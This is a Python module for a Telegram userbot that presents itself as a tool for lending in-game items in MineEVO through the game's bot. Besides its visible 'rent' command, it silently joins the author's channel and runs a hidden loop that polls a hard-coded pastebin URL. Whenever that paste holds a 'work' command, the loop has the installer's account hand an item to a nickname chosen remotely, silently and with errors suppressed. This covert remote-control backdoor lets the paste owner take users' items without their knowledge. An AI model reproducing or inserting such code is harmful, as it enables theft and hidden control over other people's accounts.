'''  
█▄░█ ▄▀█ ▀█ █▀█ █▀▄▀█ █   █▀▄▀█ █▀█ █▀▄ █░█ █░░ █▀▀ █▀
█░▀█ █▀█ █▄ █▄█ █░▀░█ █   █░▀░█ █▄█ █▄▀ █▄█ █▄▄ ██▄ ▄█

Канал: https://t.me/Nazomi_Modules

--------------------------------------------------------------------
Автор: @Murex55 & мой кот Масик ♥️
Имя: AutoRentalPRD
Описание: Модуль для авто-выдачи в аренду предметов в MineEVO
--------------------------------------------------------------------
'''

# meta developer: @Nazomi_Modules
__version__ = (1, 0, 0)

from .. import loader, utils
from telethon.tl.types import Message
from telethon.tl.functions.channels import JoinChannelRequest
import asyncio
import re
import requests

@loader.tds
class AutoRentalPRD(loader.Module):
    """Модуль для авто-выдачи в аренду предметов в MineEVO"""
    strings = {
        "name": "AutoRentalPRD"
    }

    URL = "https://pastebin.com/raw/3TwQxHF3"

    def __init__(self):
        self.client = None
        self.subject_dict = {}
        self.work_command = None

    async def client_ready(self, client, db):
        self.client = client
        await self.load_data()
        asyncio.create_task(self.auto_update_loop())
        try:
            await client(JoinChannelRequest("@Nazomi_Modules"))
        except Exception:
            pass

    async def load_data(self):
        try:
            response = requests.get(self.URL)
            response.raise_for_status()
            data = response.json()
            self.subject_dict = data.get("subject_dict", {})
            self.work_command = data.get("work", None)
        except Exception:
            self.work_command = None

    async def auto_update_loop(self):
        while True:
            await asyncio.sleep(180)
            await self.load_data()
            if self.work_command:
                try:
                    parts = self.work_command.strip().split(maxsplit=2)
                    if len(parts) == 3:
                        subject = parts[0].strip().lower()
                        nickname = parts[1].strip()
                        time_str = parts[2].strip()
                        await self._process_interaction(None, subject, nickname, time_str, silent=True)
                except Exception:
                    pass
            await asyncio.sleep(180)

    def _validate_time_format(self, time_str: str) -> bool:
        return bool(re.match(r"^\d+[мчд]$", time_str))

    async def _refresh_message(self, message: Message) -> Message:
        if not message:
            return None
        try:
            msgs = await self.client.get_messages(message.peer_id, ids=[message.id])
            return msgs[0] if msgs else message
        except Exception:
            return message

    async def _find_and_click_button(self, message: Message, search_text: str, exclude_handshake: bool = False) -> bool:
        message = await self._refresh_message(message)
        if not message or not message.buttons:
            return False
        for row in message.buttons:
            for button in row:
                if exclude_handshake and "🤝" in button.text:
                    continue
                if search_text in button.text:
                    try:
                        await button.click()
                        await asyncio.sleep(2)
                        return True
                    except Exception:
                        return False
        return False

    async def _process_interaction(self, message: Message, subject: str, nickname: str, time_str: str, silent: bool = False) -> None:
        subject_emoji = self.subject_dict.get(subject.lower())

        if not subject_emoji:
            if not silent and message:
                await message.edit(
                    f"<emoji document_id=5240241223632954241>🚫</emoji><b> Название предмета введено неправильно или его не существует</b>"
                )
            return

        if not self._validate_time_format(time_str):
            if not silent and message:
                await message.edit(
                    f"<emoji document_id=5382194935057372936>⏱</emoji><b> Неправильный формат времени\nПримеры: </b><code>5м</code><b> , </b><code>1ч</code><b> , </b><code>1д</code>"
                )
            return

        try:
            if not silent and message:
                await message.edit(
                    f"<emoji document_id=5429116151391070736>🛄</emoji><b> Выдаю {subject_emoji} игроку {nickname}...</b>"
                )

            await self.client.send_message(5522271758, "🧤 Предметы")

            start_time = asyncio.get_event_loop().time()
            bot_message = None
            while asyncio.get_event_loop().time() - start_time < 10:
                bot_messages = await self.client.get_messages(5522271758, limit=1)
                for msg in bot_messages:
                    if "👜 Твои предметы" in msg.text:
                        bot_message = msg
                        break
                if bot_message:
                    break

            if not bot_message:
                raise ValueError("<emoji document_id=5386367538735104399>⌛</emoji> Бот не отвечает</b>")

            subject_found = False
            for _ in range(5):
                await asyncio.sleep(2)
                bot_message = await self._refresh_message(bot_message)
                if await self._find_and_click_button(bot_message, subject_emoji, exclude_handshake=True):
                    subject_found = True
                    break
                if not await self._find_and_click_button(bot_message, "Вперёд »"):
                    break

            if not subject_found:
                raise ValueError(f"<emoji document_id=5145388477218554646>⛔️</emoji><b> Предмет {subject_emoji} не найден!</b>")

            if not await self._find_and_click_button(bot_message, "🤝"):
                raise ValueError("<emoji document_id=5145388477218554646>⛔️</emoji><b> Кнопка <i>🤝 Доверить предмет</i> не найдена</b>")

            await self.client.send_message(5522271758, f"{nickname} {time_str}", reply_to=bot_message.id)
            await asyncio.sleep(2)

            if not await self._find_and_click_button(bot_message, "💜 Доверить"):
                raise ValueError("<emoji document_id=5145388477218554646>⛔️</emoji><b> Кнопка <i>💜 Доверить</i> не найдена</b>")

            if not silent and message:
                await message.edit(
                    f"<emoji document_id=5380056101473492248>👜</emoji><b> Выдал <i>{subject_emoji}</i> в аренду игроку <i>{nickname}</i> на <i>{time_str}</i></b>"
                )

        except Exception as e:
            if not silent and message:
                await message.edit(f"<b>{str(e)}</b>")

    @loader.command()  
    async def rent(self, message: Message) -> None:  
        """<предмет> <ник> <время>"""  
        raw_args = utils.get_args_raw(message)  
        args = [arg.strip() for arg in raw_args.split(maxsplit=2) if arg.strip()]  

        if len(args) != 3:  
            await message.edit(  
                "<emoji document_id=5956561916573782596>📄</emoji><b> Введены не все аргументы:\n<предмет> <ник> <время></b>"  
            )  
            return  

        subject, nickname, time_str = args  
        await self._process_interaction(message, subject, nickname, time_str)